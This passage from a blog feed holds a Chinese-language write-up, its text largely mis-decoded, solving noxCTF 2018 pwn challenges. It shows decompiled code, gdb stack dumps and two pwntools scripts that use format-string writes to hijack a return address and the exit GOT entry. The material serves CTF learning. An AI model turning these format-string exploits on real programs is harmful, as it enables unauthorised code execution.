class="string">.</span></span><br></pre></td></tr></table></figure><p>è§£å¯†å¾—åˆ°flagï¼š<code>noxCTF{W0uld_y0u_bl1nd_d4t3_4_bl1nd_d4t3?}</code></p><h1 id="PWN-believeMe"><a href="#PWN-believeMe" class="headerlink" title="PWN-believeMe"></a>PWN-believeMe</h1><p>åšå‡ºçš„ç¬¬ä¸€é“æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ‹¿åˆ°é¢˜ç›®å…ˆfileä¸€ä¸‹ï¼Œç„¶åå†çœ‹çœ‹å¼€äº†ä»€ä¹ˆä¿æŠ¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[noxCTF-believeMe] file believeMe                                      1:36:01 </span><br><span class="line">believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped</span><br><span class="line">[noxCTF-believeMe] checksec believeMe                                  1:36:06 </span><br><span class="line">[*] '/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>ç„¶åæ‹–è¿›idaä¸­æŸ¥çœ‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+14h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(aSomeoneToldMeT);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">39</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">"\n"</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mainå‡½æ•°ä¸­å¯¹å­—ç¬¦ä¸²é•¿åº¦åšäº†é™åˆ¶ï¼Œå¹¶ä¸”å­˜åœ¨æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ç„¶åå¾ˆå®¹æ˜“å‘ç°æœ‰ä¸€ä¸ªå¥‡æ€ªçš„å‡½æ•°<code>noxFlag</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">noxFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> i; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = fgetc(stream); i != <span class="number">-1</span>; i = fgetc(stream) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">putchar</span>(i);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fclose(stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Can't read file \n"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºé¢˜ç›®ä¸­æåˆ°ç¯å¢ƒæ˜¯ä¸å¼€å¯ASLRçš„ï¼Œé‚£ä¹ˆè¿™é“é¢˜çš„æ€è·¯å°±å¾ˆæ˜ç¡®ï¼šé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ³„æ¼å‡ºmainå‡½æ•°retçš„åœ°å€ï¼Œä¿®æ”¹ä¸º<code>noxFlag</code>çš„åœ°å€ï¼Œå¾—åˆ°<code>flag.txt</code>çš„å†…å®¹ã€‚</p><p>gdbè°ƒè¯•ï¼Œé€šè¿‡æŸ¥çœ‹æ ˆä¸Šçš„å†…å®¹å¾—åˆ°å­—ç¬¦ä¸²çš„offsetï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0xffffceb0 --&gt; 0xffffced4 (&quot;AAAA&quot;)</span><br><span class="line">0004| 0xffffceb4 --&gt; 0x804890c --&gt; 0xa (&apos;\n&apos;)</span><br><span class="line">0008| 0xffffceb8 --&gt; 0xf7fb35a0 --&gt; 0xfbad2288 </span><br><span class="line">0012| 0xffffcebc --&gt; 0x7f17 </span><br><span class="line">0016| 0xffffcec0 --&gt; 0xffffffff </span><br><span class="line">0020| 0xffffcec4 --&gt; 0x2f (&apos;/&apos;)</span><br><span class="line">0024| 0xffffcec8 --&gt; 0xf7e0ddc8 --&gt; 0x2b76 (&apos;v+&apos;)</span><br><span class="line">0028| 0xffffcecc --&gt; 0xffffcfb4 --&gt; 0xffffd18d (&quot;/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe&quot;)</span><br><span class="line">0032| 0xffffced0 --&gt; 0x8000 </span><br><span class="line">0036| 0xffffced4 (&quot;AAAA&quot;)</span><br></pre></td></tr></table></figure><p>å…³äºretçš„åœ°å€ï¼Œä¹Ÿé€šè¿‡åœ¨æ ˆä¸Šçš„è§‚å¯Ÿï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0084| 0xffffce94 --&gt; 0xffffceb0 --&gt; 0x1 </span><br><span class="line">0088| 0xffffce98 --&gt; 0x0 </span><br><span class="line">0092| 0xffffce9c --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;:add    esp,0x10)</span><br><span class="line">0096| 0xffffcea0 --&gt; 0xf7fb3000 --&gt; 0x1b1db0 </span><br><span class="line">--More--(25/50)</span><br><span class="line">0100| 0xffffcea4 --&gt; 0xf7fb3000 --&gt; 0x1b1db0 </span><br><span class="line">0104| 0xffffcea8 --&gt; 0x0 </span><br><span class="line">0108| 0xffffceac --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;:add    esp,0x10)</span><br><span class="line">0112| 0xffffceb0 --&gt; 0x1</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ¬åœ°retçš„åœ°å€å³ä¸º<code>0xffffceac</code>ï¼Œç„¶åéœ€è¦åˆ©ç”¨æ¼æ´ï¼Œæ³„æ¼å‡ºè¿œç¨‹çš„åœ°å€ã€‚ä»”ç»†è§‚å¯Ÿå‘ç°offsetä¸º84å’Œ112å¤„çš„è”ç³»ï¼Œå³åªéœ€è¦æ³„æ¼å‡ºoffsetä¸º84çš„å†…å®¹ï¼Œå†å°†ç»“æœå‡å»4å³èƒ½å¾—åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šretçš„åœ°å€ã€‚</p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„payloadè¿˜å¯ä»¥åˆ©ç”¨<code>pwntools</code>ä¸­çš„ä¸€ä¸ªå‡½æ•°<code>fmtstr_payload</code>ï¼Œç”¨äºè‡ªåŠ¨ç”Ÿæˆæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚<code>fmtstr_payload</code>æœ‰ä¸‰ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>int</code>ï¼Œç”¨äºè¡¨ç¤ºå–å‚æ•°çš„åç§»ä¸ªæ•°ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯å­—å…¸ï¼Œå­—å…¸çš„æ„ä¹‰æ˜¯å¾€<code>key</code>çš„åœ°å€ï¼Œå†™å…¥<code>value</code>çš„å€¼ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°<code>write_size</code>ï¼Œå¯ä»¥æ”¹å˜payloadçš„å½¢å¼ï¼Œ<code>byte</code>å¯¹åº”<code>%hhn</code>ï¼Œ<code>short</code>å¯¹åº”<code>%hn</code>ï¼Œ<code>int</code>å¯¹åº”<code>%n</code>ã€‚</p><p>æœ€åå¯ä»¥å†™å‡ºexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./believeMe'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'18.223.228.52'</span>, <span class="number">13337</span>)</span><br><span class="line">flag_addr = <span class="number">0x0804867B</span></span><br><span class="line">ret_addr = <span class="number">0xffffdd2c</span> <span class="comment"># local: 0xffffd2bc</span></span><br><span class="line">offset = <span class="number">9</span></span><br><span class="line"><span class="comment"># payload = p32(0xdeadbeef) + '%&#123;&#125;$p'.format(str(offset)) # test offset</span></span><br><span class="line"><span class="comment"># payload = '0x%21$08x' # test ret_addr</span></span><br><span class="line"><span class="comment"># payload = p32(ret_addr + 2) + p32(ret_addr) + '%2044c%9$hn%32375c%10$hn'</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;ret_addr:flag_addr&#125;, write_size=<span class="string">'short'</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(payload) &lt; <span class="number">39</span>)</span><br><span class="line">p.recvuntil(<span class="string">'????'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, 'b *0x80487d3\nc')</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="PWN-The-Name-Calculator"><a href="#PWN-The-Name-Calculator" class="headerlink" title="PWN-The Name Calculator"></a>PWN-The Name Calculator</h1><p>åˆæ˜¯ä¸€é“æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè¿˜æ¶‰åŠåˆ°æ ˆæº¢å‡ºã€‚å…ˆåç¼–è¯‘æŸ¥çœ‹mainå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What is your name?"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>u);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">0x6A4B825</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    secretFunc();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"I've heard better"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸€ä¸‹v4å’Œbufåœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œå‘ç°å¯ä»¥æº¢å‡ºè¿›å…¥<code>secretFunc</code>ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">secretFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *i; <span class="comment">// [esp+8h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v3; <span class="comment">// [esp+18h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> buf[<span class="number">7</span>]; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *retaddr; <span class="comment">// [esp+4Ch] [ebp+4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    buf[v0] = <span class="number">0</span>;</span><br><span class="line">    ++v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 &lt; <span class="number">7</span> );</span><br><span class="line">  retAddr = (<span class="keyword">int</span>)retaddr;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Say that again please"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v3 = read(<span class="number">0</span>, buf, <span class="number">0x1B</span>u);</span><br><span class="line">  *((_BYTE *)buf + v3) = <span class="number">0</span>;</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = buf; i &lt; (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;buf[<span class="number">-1</span>] + v3); i = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)i + <span class="number">1</span>) )</span><br><span class="line">    *i ^= <span class="number">0x5F7B4153</span>u;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your name was encrypted using the best encryption in the world"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This is your new name: "</span>);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ( retaddr != (<span class="keyword">void</span> *)retAddr )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸­é—´å¯¹è¾“å…¥çš„bufè¿›è¡Œäº†å¼‚æˆ–ï¼Œä»ç¬¬ä¸€å­—ç¬¦å¼€å§‹ï¼Œæ­¥é•¿ä¸º1ï¼Œæ¯æ¬¡å–å››ä¸ªå­—ç¬¦ï¼Œè½¬æ¢ä¸ºintå‹åä¸ç‰¹å®šæ•°å­—å¼‚æˆ–ï¼Œå¾ªç¯ç›´åˆ°å€’æ•°ç¬¬å››ä¸ªå­—ç¬¦ã€‚åé¢bufè¿™é‡Œçš„<code>printf</code>æ˜æ˜¾å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚ç„¶ååˆå‘ç°äº†ä¸€ä¸ª<code>superSecretFunc</code>å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">superSecretFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here is your flag: "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚çŸ¥é“äº†æ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹æŸä¸ªretçš„åœ°å€ï¼Œç„¶ååœ¨<code>superSecretFunc</code>è¿™é‡Œæ‰§è¡Œ<code>cat flag</code>ã€‚å›å¤´å†çœ‹åˆ°mainå‡½æ•°è°ƒç”¨äº†<code>exit</code>ï¼Œè¿™é‡Œå°±å¯ä»¥é€šè¿‡ä¿®æ”¹<code>exit</code>çš„gotè¡¨å®ç°è·³è½¬ã€‚ç„¶åå…ˆé€šè¿‡gdbè°ƒè¯•æ‰¾åˆ°åœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pdis exit</span><br><span class="line">Dump of assembler code for function exit@plt:</span><br><span class="line">   0x08048470 &lt;+0&gt;:jmp    DWORD PTR ds:0x804a024</span><br><span class="line">   0x08048476 &lt;+6&gt;:push   0x30</span><br><span class="line">   0x0804847b &lt;+11&gt;:jmp    0x8048400</span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$ x/wx 0x804a024</span><br><span class="line">0x804a024:0x08048476</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ ˆä¸Šåˆ†å¸ƒï¼Œå¾—åˆ°å­—ç¬¦ä¸²çš„åç§»ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0000| 0xffbc27e0 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\n\n&apos;)</span><br><span class="line">0004| 0xffbc27e4 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\n\n&apos;)</span><br><span class="line">0008| 0xffbc27e8 --&gt; 0x1b </span><br><span class="line">0012| 0xffbc27ec --&gt; 0xf75badfb (&lt;_IO_puts+347&gt;:add    esp,0x10)</span><br><span class="line">0016| 0xffbc27f0 --&gt; 0xf75c31d7 (&lt;_IO_new_file_sync+7&gt;:add    esi,0x149e29)</span><br><span class="line">0020| 0xffbc27f4 --&gt; 0xf770d000 --&gt; 0x1b1db0 </span><br><span class="line">0024| 0xffbc27f8 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\n\n&apos;)</span><br><span class="line">0028| 0xffbc27fc --&gt; 0x804879a (&lt;main+112&gt;:jmp    0x80487bd &lt;main+147&gt;)</span><br><span class="line">0032| 0xffbc2800 (&quot;SA&#123;_&quot;)</span><br><span class="line">0036| 0xffbc2804 --&gt; 0x0 </span><br><span class="line">0040| 0xffbc2808 --&gt; 0x2 </span><br><span class="line">0044| 0xffbc280c --&gt; 0xf770d000 --&gt; 0x1b1db0 </span><br><span class="line">0048| 0xffbc2810 --&gt; 0xa0a (&apos;\n\n&apos;)</span><br></pre></td></tr></table></figure><p>æœ€åçš„expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./CAL'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'chal.noxale.com'</span>, <span class="number">5678</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_op</span><span class="params">(s)</span>:</span></span><br><span class="line">xor_num = <span class="number">0x5F7B4153</span></span><br><span class="line">l = list(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(l) - <span class="number">4</span>):</span><br><span class="line">t = <span class="string">''</span>.join(l[i:i + <span class="number">4</span>])</span><br><span class="line">l[i:i + <span class="number">4</span>] = list(p32(u32(t) ^ xor_num))</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join(l)</span><br><span class="line"></span><br><span class="line">offset1 = <span class="number">28</span></span><br><span class="line">v4 = <span class="number">0x6A4B825</span></span><br><span class="line">offset2 = <span class="number">12</span></span><br><span class="line">exit_got = <span class="number">0x804a024</span></span><br><span class="line">super_addr = <span class="number">0x08048596</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, 'b *0x8048656')</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload1 = <span class="string">'A'</span> * offset1 + p32(v4)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'please'</span>)</span><br><span class="line">payload2 = xor_op(p32(exit_got) + <span class="string">'%34194c%12$hn'</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(payload2) &lt; <span class="number">0x1B</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒç½‘ç«™"><a href="#å‚è€ƒç½‘ç«™" class="headerlink" title="å‚è€ƒç½‘ç«™"></a>å‚è€ƒç½‘ç«™</h1><p><a href="https://github.com/OAlienO/CTF/tree/master/2018/noxCTF/Guess-The-String" target="_blank" rel="noopener">https://github.com/OAlienO/CTF/tree/master/2018/noxCTF/Guess-The-String</a><br><a href="https://github.com/imthoe/noxCTF/tree/master/BlindDate" target="_blank" rel="noopener">https://github.com/imthoe/noxCTF/tree/master/BlindDate</a><br><a href="https://www.pwndiary.com/write-ups/noxctf-2018-believeme-write-up-pwn378/" target="_blank" rel="noopener">https://www.pwndiary.com/write-ups/noxctf-2018-believeme-write-up-pwn378/</a><br><a href="https://www.pwndiary.com/write-ups/noxctf-2018-the-name-calculator-write-up-pwn537/" target="_blank" rel="noopener">https://www.pwndiary.com/write-ups/noxctf-2018-the-name-calculator-write-up-pwn537/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è®°å½•å‡ é“ç®€å•é¢˜ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="wp" scheme="https://qianfei11.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>åˆ©ç”¨VPSæ­å»ºShadowsocksç§‘å­¦ä¸Šç½‘</title>
    <link href="https://qianfei11.github.io/2018/09/08/%E5%88%A9%E7%94%A8VPS%E6%90%AD%E5%BB%BAShadowsocks%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    <id>https://qianfei11.github.io/2018/09/08/åˆ©ç”¨VPSæ­å»ºShadowsocksç§‘å­¦ä¸Šç½‘/</id>
    <published>2018-09-08T03:37:55.000Z</published>
    <updated>2018-09-24T10:35:13.984Z</updated>
    
